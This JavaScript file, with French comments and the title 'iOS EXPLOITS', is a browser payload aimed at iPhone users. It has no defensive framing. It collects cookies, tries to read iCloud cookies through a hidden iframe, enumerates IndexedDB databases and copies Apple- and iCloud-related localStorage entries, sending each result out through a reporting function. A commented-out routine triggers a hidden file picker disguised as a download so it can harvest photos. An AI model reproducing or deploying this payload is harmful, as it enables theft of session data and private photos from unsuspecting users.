/**
 * iOS EXPLOITS - LIMITÉS MAIS PUISSANTS
 */

(function() {
    'use strict';
    
    if (typeof OS === 'undefined' || OS !== 'iOS') return;
    
    const Utils = window.Utils || {
        send: function(type, data) {
            console.log('[iOS]', type, data);
        }
    };
    
    // ============================================
    // 1. WEBKIT MESSAGE HANDLERS
    // ============================================
    const WebKitExploit = {
        messageHandlers: function() {
            if (window.webkit && window.webkit.messageHandlers) {
                Object.keys(window.webkit.messageHandlers).forEach(handler => {
                    try {
                        window.webkit.messageHandlers[handler].postMessage({
                            type: 'info',
                            data: {
                                url: window.location.href,
                                ua: navigator.userAgent,
                                timestamp: Date.now()
                            }
                        });
                        
                        Utils.send('webkit_handler', { name: handler });
                    } catch(e) {}
                });
            }
        },
        
        // Tentative de communication avec l'application hôte
        webviewInterface: function() {
            if (window.WebView && window.WebView.respond) {
                window.WebView.respond(JSON.stringify({
                    cmd: 'get_info',
                    id: Date.now()
                }));
            }
        }
    };
    
    // ============================================
    // 2. SAFARI SPECIFIC
    // ============================================
    const SafariExploit = {
        // Accès aux cookies (limité)
        cookies: function() {
            if (document.cookie) {
                Utils.send('cookies', document.cookie);
            }
            
            // Tentative d'accès aux cookies d'autres domaines (UXSS)
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://www.icloud.com';
            iframe.onload = function() {
                try {
                    const cookies = iframe.contentDocument.cookie;
                    if (cookies) {
                        Utils.send('icloud_cookies', cookies);
                    }
                } catch(e) {}
            };
            document.body.appendChild(iframe);
        },
        
        // IndexedDB (peut contenir des données)
        indexedDB: function() {
            if (!window.indexedDB) return;
            
            const databases = ['_appstore', 'safari', 'webkit', 'icloud'];
            databases.forEach(name => {
                try {
                    const request = indexedDB.open(name);
                    request.onsuccess = function() {
                        const db = this.result;
                        try {
                            const storeNames = db.objectStoreNames;
                            if (storeNames.length) {
                                Utils.send('indexeddb', {
                                    name: name,
                                    stores: Array.from(storeNames)
                                });
                            }
                        } catch(e) {}
                        db.close();
                    };
                } catch(e) {}
            });
        },
        
        // LocalStorage iCloud
        icloudStorage: function() {
            try {
                const data = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.includes('icloud') || key.includes('apple')) {
                        data[key] = localStorage.getItem(key);
                    }
                }
                if (Object.keys(data).length) {
                    Utils.send('icloud_storage', data);
                }
            } catch(e) {}
        }
    };
    
    // ============================================
    // 3. PHOTO LIBRARY (via Input)
    // ============================================
    const PhotoExploit = {
        requestAccess: function() {
            // Créer un input file pour accéder à la galerie
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.multiple = true;
            input.style.display = 'none';
            
            input.onchange = function(e) {
                const files = Array.from(e.target.files);
                const photos = [];
                
                files.slice(0, 10).forEach(file => {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        photos.push({
                            name: file.name,
                            size: file.size,
                            type: file.type,
                            data: e.target.result.split(',')[1]
                        });
                        
                        if (photos.length === files.slice(0, 10).length) {
                            Utils.send('photos', photos);
                        }
                    };
                    reader.readAsDataURL(file);
                });
            };
            
            document.body.appendChild(input);
            
            // Déclencher après un délai (simuler un téléchargement)
            setTimeout(() => {
                input.click();
            }, 3000);
        }
    };
    
    // ============================================
    // 4. EXÉCUTION
    // ============================================
    function runIOSExploits() {
        setTimeout(() => {
            WebKitExploit.messageHandlers();
            WebKitExploit.webviewInterface();
            
            setTimeout(() => {
                SafariExploit.cookies();
                SafariExploit.indexedDB();
                SafariExploit.icloudStorage();
            }, 2000);
            
            setTimeout(() => {
                // PhotoExploit.requestAccess(); // Dangereux, activer si besoin
            }, 4000);
            
        }, 1000);
    }
    
    runIOSExploits();
})();
